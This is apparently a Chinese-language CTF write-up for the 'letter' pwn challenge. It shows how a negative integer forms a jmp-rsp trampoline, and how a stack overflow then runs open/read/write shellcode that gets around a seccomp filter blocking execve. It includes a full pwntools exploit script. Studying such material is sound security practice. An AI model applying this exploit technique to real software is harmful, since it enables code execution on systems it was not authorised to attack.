# letter

## 题目简述

程序允许写入一个有符号整数，并在后续输入中存在栈溢出。整数校验可被负数绕过，使其低位字节在内存中形成 `jmp rsp` 指令；同时 seccomp 白名单允许 `open`、`read`、`write` 等调用，却不允许通过 `execve` 直接获得 shell。因此最终需要把执行流跳到栈上并运行 ORW shellcode 读取 flag。

## 解题过程

输入十进制负数 `-268376833` 时，其 32 位补码为 `0xf000e4ff`，小端内存中的开头两个字节是 `ff e4`，对应 `jmp rsp`。官方二进制中这段可执行字节位于 `0x60108c`。

seccomp 规则不允许常规 `shellcraft.sh()` 使用的 `execve`，但保留了文件读写相关系统调用，所以 shellcode 依次执行：

1. `open("flag", 0, 0)`；
2. 从返回的文件描述符读取数据到可写地址 `0x601070`；
3. 把该缓冲区写到标准输出。

对应利用骨架如下：

```python
from pwn import *

context.arch = "amd64"
io = process("./letter")

io.sendlineafter(b"?", b"-268376833")

shellcode = asm(
    shellcraft.open("flag", 0, 0)
    + shellcraft.read("rax", 0x601070, 0x100)
    + shellcraft.write(1, 0x601070, 0x100)
)

payload = b"A" * 0x18
payload += p64(0x60108C)
payload += shellcode
io.sendline(payload)
print(io.recvall())
```

这里把 `open` 返回的 `rax` 直接作为 `read` 的文件描述符，比假定它固定为 `3` 更稳。若附件版本中的整数存储地址变化，应在调试器中确认 `ff e4` 的实际地址后再替换返回目标。

## 方法总结

本题把有符号整数绕过、指令字节构造、栈溢出和 seccomp 约束串在一起。看到“可控整数写入 + 可执行数据区”时，可以检查补码字节能否组成短跳板；看到 seccomp 时不要默认目标仍是 getshell，应先列出允许的系统调用，常见替代路线是 ORW 直接读取 flag。
